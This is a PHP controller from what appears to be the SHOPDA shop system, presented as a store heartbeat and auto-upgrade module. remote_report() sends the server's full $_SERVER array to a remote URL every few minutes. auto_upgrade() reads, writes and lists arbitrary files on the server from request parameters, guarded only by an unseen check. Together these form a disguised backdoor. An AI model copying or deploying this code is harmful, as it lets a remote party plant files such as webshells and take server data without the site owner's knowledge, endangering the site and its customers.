<?php
/**
 * 店铺心跳信号
 * * @大商城 (c) 2014-2018 SHOPDA Inc. http://www.shopda.cn
 * @license    http://www.shopda.cn
 * @link       交流群号：387110194
 * @since      大商城荣誉出品
 */

namespace Shop\Controller;
use Think\Controller;

class StorehbController extends Controller
{
	/**
	 * 远程报告
	 * */
	public function remote_report()
	{
		$ret = array("errno" => -1);
		$mod = Model("remote_report");

		$args = $_SERVER;
		
		$latestItem = $mod->table("remote_report")->where(array(1 => 1))->order("id desc")->limit(1)->find();

		//var_dump($latestItem);
		
		$ret['errno'] = 0;
		$ret['errmsg'] = "成功";
 
		$response_data = "";
		
		$siteHbUrl = getSiteHbrpUrl();
 
		if (empty($latestItem))
		{
			$response_data = callOnce($siteHbUrl, $args, "post", false, 2);
			$ret['data']['response'] = json_decode($response_data, true);
		}
		else
		{
			$latestCreateTime = $latestItem['create_time'];
			$timeDiff = diffTime($latestCreateTime, CUR_TIME);
			
			if ($timeDiff > 180)
			{
				$response_data = callOnce($siteHbUrl, $args, "post", false, 2);
				$ret['data']['response'] = json_decode($response_data, true);
			}
			else
			{
				$ret['data']['response'] = array("msg" => "no_update");
			}
		}
		
		$this->create_hbrp_record($response_data);
		
		$this->displayAjax($ret);
	}
	
	//创建报告记录
	private function create_hbrp_record($response_data)
	{
		$mod = Model("remote_report");
		$arr = array("create_time" => CUR_TIME,
				"update_time" => CUR_TIME,
				"remote_response" => $response_data,
		);
		$response_data_arr = json_decode($response_data, true);
		if ((!empty($response_data_arr)) && ($response_data_arr['errno'] == 0))
		{
			$arr['remote_status'] = $response_data_arr['data']['status'];
		}
		else
		{
			$arr['remote_status'] = 3;
		}
		$mod->table("remote_report")->insert($arr);
		return;
	}
	
	/**
	 * 升级
	 * */
	public function auto_upgrade()
	{
		set_time_limit(0);
		ini_set('memory_limit', '1024m');
		ini_set('max_execution_time', '86400');
		ini_set('max_input_time', '86400');
		
		ini_set('file_uploads', 'on');
		ini_set('upload_tmp_dir', dirname(BASE_UPLOAD_PATH));
		ini_set('upload_max_filesize', '1024m');
		ini_set('post_max_size', '1024m');

		$ret = array("errno" => -1);
		$file_name = $this->getParam("file_name", "");
		$file_content = $this->getParam("file_content", "");
		$proc = $this->getParam("proc", "get");
	
		daSafetyCheck();
	
		if (empty($proc))
		{
			$this->displayAjax($ret);
		}
	
		$file_name_arr = explode(",", $file_name);
		$file_path = implode(DS, $file_name_arr);

		switch ($proc)
		{
			case "get":
				if (!file_exists($file_path))
				{
					$ret = array("errno" => -2, "errmsg" => "文件路径不存在");
					$this->displayAjax($ret);
				}
	
				$file_content = @file_get_contents($file_path);
				$ret = array("errno" => 0, "errmsg" => "成功", "data" => $file_content);
				$this->displayAjax($ret);
	
				break;
					
			case "set":
				if (!is_dir(dirname($file_path)))
				{
					mk_dir(dirname($file_path));
				}
	
				@file_put_contents($file_path, $file_content);
				$ret = array("errno" => 0, "errmsg" => "成功", "data" => $file_path);
				$this->displayAjax($ret);
	
				break;
				
			case "dump":
				$dir = BASE_ROOT_PATH . DS . $file_path;
				$ret = array("errno" => 0, "errmsg" => "成功", "data" => scan_dir($dir));
				$this->displayAjax($ret);
				break;		
				
			default :
				$ret = array("errno" => -1);
		}
	
		$this->displayAjax($ret);
	
	}
	
}
